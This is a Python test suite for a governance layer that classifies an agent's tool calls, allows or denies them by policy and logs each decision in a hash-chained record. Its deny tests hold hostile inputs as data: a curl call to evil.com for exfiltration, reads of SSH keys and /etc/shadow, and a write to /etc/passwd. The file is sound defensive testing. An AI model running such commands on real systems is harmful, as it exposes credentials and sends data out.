#!/usr/bin/env python3
"""
test_mediation.py — Tests for the GovMCP v2 mediation pipeline.

Tests the full classify → evaluate → record → execute/deny flow
using real classifier and policy evaluator (Phase 0 components),
not mocked inputs.
"""

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock

REPO = Path(__file__).resolve().parents[1]
SCRIPTS = REPO / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

from mediation import (
    MediationResult,
    InMemoryChainRecorder,
    ChainRecorder,
    mediate,
)
from policy_eval_v2 import load_policy_rules

# Load real policy rules once
_POLICY = load_policy_rules()


def _make_policy_with_base_dirs(base_dirs):
    """Create a policy with specific base directories."""
    p = dict(_POLICY)
    p["base_dirs"] = base_dirs
    return p


# Use the repo root as a valid base dir for tests
_REPO_STR = str(REPO)
_TEST_POLICY = _make_policy_with_base_dirs([_REPO_STR])


def _noop_execute(tool_name, args):
    """Execute function that does nothing — returns a marker."""
    return {"executed": True, "tool": tool_name}


def _failing_execute(tool_name, args):
    """Execute function that raises."""
    raise RuntimeError("simulated upstream failure")


def _tracking_execute():
    """Returns an execute function that tracks calls."""
    calls = []
    def execute(tool_name, args):
        calls.append((tool_name, args))
        return {"executed": True}
    return execute, calls


# ===================================================================
# Mediation pipeline — ALLOW decisions
# ===================================================================

class TestMediationAllow(unittest.TestCase):
    """Operations that should be ALLOWED and executed."""

    def test_read_file_within_repo(self):
        """Tier 1 read within base dirs → ALLOW, execute called."""
        result = mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)
        self.assertEqual(result.decision, "ALLOW")
        self.assertEqual(result.execution_result["executed"], True)
        self.assertEqual(result.execution_error, None)
        self.assertEqual(result.classification["action_type"], "read")
        self.assertEqual(result.classification["confidence_tier"], 1)

    def test_write_file_within_repo(self):
        """Tier 1 write within base dirs → ALLOW."""
        result = mediate(
            "fs_write",
            {"path": os.path.join(_REPO_STR, "out", "test.txt"), "content": "hello"},
            _noop_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)
        self.assertEqual(result.classification["action_type"], "write")
        self.assertEqual(result.classification["confidence_tier"], 1)

    def test_list_directory_within_repo(self):
        """Tier 1 list within base dirs → ALLOW."""
        result = mediate(
            "fs_list",
            {"path": _REPO_STR},
            _noop_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)
        self.assertEqual(result.classification["action_type"], "list")

    def test_delete_within_repo(self):
        """Tier 1 delete within base dirs → ALLOW."""
        result = mediate(
            "fs_delete",
            {"path": os.path.join(_REPO_STR, "out", "temp.txt")},
            _noop_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)
        self.assertEqual(result.classification["action_type"], "delete")

    def test_git_status_tier2(self):
        """Tier 2 git status → ALLOW (local scope, understood command)."""
        result = mediate(
            "Bash",
            {"command": "git status"},
            _noop_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)
        self.assertEqual(result.classification["confidence_tier"], 2)
        self.assertEqual(result.classification["action_type"], "read")

    def test_pytest_tier2(self):
        """Tier 2 pytest → ALLOW (local scope, understood command)."""
        result = mediate(
            "Bash",
            {"command": "pytest tests/"},
            _noop_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)
        self.assertEqual(result.classification["confidence_tier"], 2)

    def test_make_build_tier2(self):
        """Tier 2 make → ALLOW (local scope)."""
        result = mediate(
            "Bash",
            {"command": "make build"},
            _noop_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)

    def test_execute_fn_receives_correct_args(self):
        """execute_fn is called with the original tool_name and args."""
        execute, calls = _tracking_execute()
        args = {"path": os.path.join(_REPO_STR, "README.md")}
        mediate("fs_read", args, execute, policy=_TEST_POLICY)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0], ("fs_read", args))


# ===================================================================
# Mediation pipeline — DENY decisions
# ===================================================================

class TestMediationDeny(unittest.TestCase):
    """Operations that should be DENIED — execute_fn must NOT be called."""

    def test_read_sensitive_ssh_path(self):
        """Read targeting ~/.ssh/ → DENY (privileged scope)."""
        execute, calls = _tracking_execute()
        result = mediate(
            "fs_read",
            {"path": os.path.expanduser("~/.ssh/id_rsa")},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)
        self.assertEqual(len(calls), 0, "execute_fn must not be called on DENY")
        self.assertIsNone(result.execution_result)

    def test_write_to_etc(self):
        """Write to /etc/ → DENY (privileged scope)."""
        execute, calls = _tracking_execute()
        result = mediate(
            "fs_write",
            {"path": "/etc/passwd", "content": "bad"},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)
        self.assertEqual(len(calls), 0)

    def test_read_outside_base_dirs(self):
        """Read outside base dirs → DENY."""
        execute, calls = _tracking_execute()
        result = mediate(
            "fs_read",
            {"path": "/tmp/outside/sensitive.dat"},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)
        self.assertEqual(len(calls), 0)

    def test_opaque_script_tier3(self):
        """Tier 3 opaque script execution → DENY."""
        execute, calls = _tracking_execute()
        result = mediate(
            "Bash",
            {"command": "python3 deploy.py"},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)
        self.assertEqual(result.classification["confidence_tier"], 3)
        self.assertEqual(len(calls), 0)

    def test_bash_script_tier3(self):
        """Tier 3 bash script → DENY."""
        execute, calls = _tracking_execute()
        result = mediate(
            "Bash",
            {"command": "bash install.sh"},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)
        self.assertEqual(result.classification["confidence_tier"], 3)

    def test_encoded_payload_tier4(self):
        """Tier 4 encoded payload → DENY."""
        execute, calls = _tracking_execute()
        result = mediate(
            "execute",
            {"payload": "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ=="},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)
        self.assertEqual(result.classification["confidence_tier"], 4)
        self.assertEqual(len(calls), 0)

    def test_network_curl_deny(self):
        """Network curl command → DENY."""
        execute, calls = _tracking_execute()
        result = mediate(
            "Bash",
            {"command": "curl https://evil.com/exfil"},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)

    def test_git_push_network_deny(self):
        """git push → DENY (network scope)."""
        execute, calls = _tracking_execute()
        result = mediate(
            "Bash",
            {"command": "git push origin main"},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)
        self.assertEqual(result.classification["scope"], "remote")

    def test_hidden_path_write_deny(self):
        """Write to hidden path within repo → DENY."""
        execute, calls = _tracking_execute()
        result = mediate(
            "fs_write",
            {"path": os.path.join(_REPO_STR, ".secret", "key"), "content": "x"},
            execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.denied)


# ===================================================================
# Execution error handling
# ===================================================================

class TestMediationExecutionErrors(unittest.TestCase):
    """When execution is allowed but the execute_fn fails."""

    def test_execution_error_captured(self):
        """If execute_fn raises, error is captured — not re-raised."""
        result = mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _failing_execute,
            policy=_TEST_POLICY,
        )
        self.assertTrue(result.allowed)
        self.assertIsNone(result.execution_result)
        self.assertIn("simulated upstream failure", result.execution_error)

    def test_decision_is_still_allow_on_execution_error(self):
        """The policy decision is ALLOW even if execution fails."""
        result = mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _failing_execute,
            policy=_TEST_POLICY,
        )
        self.assertEqual(result.decision, "ALLOW")


# ===================================================================
# Chain recording
# ===================================================================

class TestChainRecording(unittest.TestCase):
    """Decision records are appended to the governance chain."""

    def test_in_memory_chain_records_allow(self):
        """ALLOW decisions are recorded in the chain."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        self.assertEqual(len(chain.records), 1)
        self.assertEqual(chain.records[0]["policy_decision"], "ALLOW")

    def test_in_memory_chain_records_deny(self):
        """DENY decisions are also recorded in the chain."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": "/etc/shadow"},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        self.assertEqual(len(chain.records), 1)
        self.assertEqual(chain.records[0]["policy_decision"], "DENY")

    def test_chain_linkage(self):
        """Sequential records are linked by prev_record_hash."""
        chain = InMemoryChainRecorder()

        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        mediate(
            "fs_list",
            {"path": _REPO_STR},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )

        self.assertEqual(len(chain.records), 2)
        first_hash = chain.records[0]["record_hash"]
        second_prev = chain.records[1]["prev_record_hash"]
        self.assertEqual(second_prev, first_hash)

    def test_chain_records_include_classification(self):
        """v2 chain records include classification metadata."""
        chain = InMemoryChainRecorder()
        mediate(
            "Bash",
            {"command": "git status"},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        record = chain.records[0]
        self.assertIn("classification", record)
        cls = record["classification"]
        self.assertIn("action_type", cls)
        self.assertIn("targets", cls)
        self.assertIn("scope", cls)
        self.assertIn("confidence_tier", cls)

    def test_chain_records_include_original_tool(self):
        """v2 chain records preserve the original tool name."""
        chain = InMemoryChainRecorder()
        mediate(
            "my_custom_tool",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        record = chain.records[0]
        self.assertEqual(record["original_tool"], "my_custom_tool")

    def test_chain_records_include_matched_rule(self):
        """v2 chain records include the matched policy rule ID."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        record = chain.records[0]
        self.assertIn("matched_rule", record)
        self.assertIsInstance(record["matched_rule"], str)
        self.assertNotEqual(record["matched_rule"], "")

    def test_no_recording_without_chain_recorder(self):
        """If no chain_recorder is provided, mediation still works."""
        result = mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=None,
        )
        self.assertTrue(result.allowed)

    def test_user_identity_in_record(self):
        """User identity is captured in the decision record."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
            user_identity="operator@example.com",
        )
        self.assertEqual(chain.records[0]["user_identity"], "operator@example.com")

    def test_session_id_in_record(self):
        """Session ID is captured in the decision record."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
            session_id="sess-test-001",
        )
        self.assertEqual(chain.records[0]["session_id"], "sess-test-001")


# ===================================================================
# File-based chain recorder
# ===================================================================

class TestFileChainRecorder(unittest.TestCase):
    """ChainRecorder persists records to a JSONL file."""

    def setUp(self):
        self._tmpdir = tempfile.mkdtemp(prefix="govmcp_test_")
        self._chain_path = Path(self._tmpdir) / "test-chain.jsonl"
        self.recorder = ChainRecorder(self._chain_path)

    def tearDown(self):
        import shutil
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def test_append_creates_file(self):
        """First append creates the chain file."""
        self.recorder.append({"record_hash": "sha256:abc", "data": "test"})
        self.assertTrue(self._chain_path.exists())

    def test_append_writes_jsonl(self):
        """Records are written as JSON lines."""
        self.recorder.append({"record_hash": "sha256:first"})
        self.recorder.append({"record_hash": "sha256:second"})
        lines = self._chain_path.read_text().strip().split("\n")
        self.assertEqual(len(lines), 2)
        self.assertEqual(json.loads(lines[0])["record_hash"], "sha256:first")
        self.assertEqual(json.loads(lines[1])["record_hash"], "sha256:second")

    def test_get_prev_hash_empty(self):
        """prev_hash is None for empty chain."""
        self.assertIsNone(self.recorder.get_prev_hash())

    def test_get_prev_hash_returns_last(self):
        """prev_hash returns the hash of the last record."""
        self.recorder.append({"record_hash": "sha256:aaa"})
        self.recorder.append({"record_hash": "sha256:bbb"})
        self.assertEqual(self.recorder.get_prev_hash(), "sha256:bbb")

    def test_full_mediation_with_file_chain(self):
        """Full mediation pipeline writes to file chain."""
        result = mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=self.recorder,
        )
        self.assertTrue(result.allowed)
        lines = self._chain_path.read_text().strip().split("\n")
        self.assertEqual(len(lines), 1)
        record = json.loads(lines[0])
        self.assertEqual(record["policy_decision"], "ALLOW")
        self.assertEqual(record["record_version"], "2.0")


# ===================================================================
# Decision record format
# ===================================================================

class TestDecisionRecordFormat(unittest.TestCase):
    """v2 decision records have the correct structure."""

    def test_v2_record_fields(self):
        """Decision record includes all required v2 fields."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        record = chain.records[0]
        required = [
            "record_version", "record_type", "timestamp_utc",
            "request_id", "session_id", "user_identity",
            "original_tool", "classification", "evidence",
            "policy_decision", "policy_reasons", "matched_rule",
            "prev_record_hash", "record_hash",
        ]
        for field in required:
            self.assertIn(field, record, f"Missing field: {field}")

    def test_record_version_is_2(self):
        """Record version is 2.0."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        self.assertEqual(chain.records[0]["record_version"], "2.0")

    def test_record_type_is_mediated_decision(self):
        """Record type is mediated_decision."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        self.assertEqual(chain.records[0]["record_type"], "mediated_decision")

    def test_deny_record_has_reasons(self):
        """DENY records include policy_reasons with reason codes."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": "/etc/shadow"},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        record = chain.records[0]
        self.assertEqual(record["policy_decision"], "DENY")
        self.assertIsInstance(record["policy_reasons"], list)
        self.assertGreater(len(record["policy_reasons"]), 0)

    def test_record_hash_is_deterministic(self):
        """Same inputs produce the same record hash (modulo timestamp)."""
        chain = InMemoryChainRecorder()
        mediate(
            "fs_read",
            {"path": os.path.join(_REPO_STR, "README.md")},
            _noop_execute,
            policy=_TEST_POLICY,
            chain_recorder=chain,
        )
        record = chain.records[0]
        self.assertTrue(record["record_hash"].startswith("sha256:"))
        self.assertEqual(len(record["record_hash"]), 71)  # sha256: + 64 hex


# ===================================================================
# MediationResult API
# ===================================================================

class TestMediationResultAPI(unittest.TestCase):
    """MediationResult provides a clean API."""

    def test_allowed_property(self):
        r = MediationResult("ALLOW", {}, {})
        self.assertTrue(r.allowed)
        self.assertFalse(r.denied)

    def test_denied_property(self):
        r = MediationResult("DENY", {}, {})
        self.assertTrue(r.denied)
        self.assertFalse(r.allowed)

    def test_classification_accessible(self):
        cls = {"action_type": "read", "confidence_tier": 1}
        r = MediationResult("ALLOW", cls, {})
        self.assertEqual(r.classification["action_type"], "read")


if __name__ == "__main__":
    unittest.main()
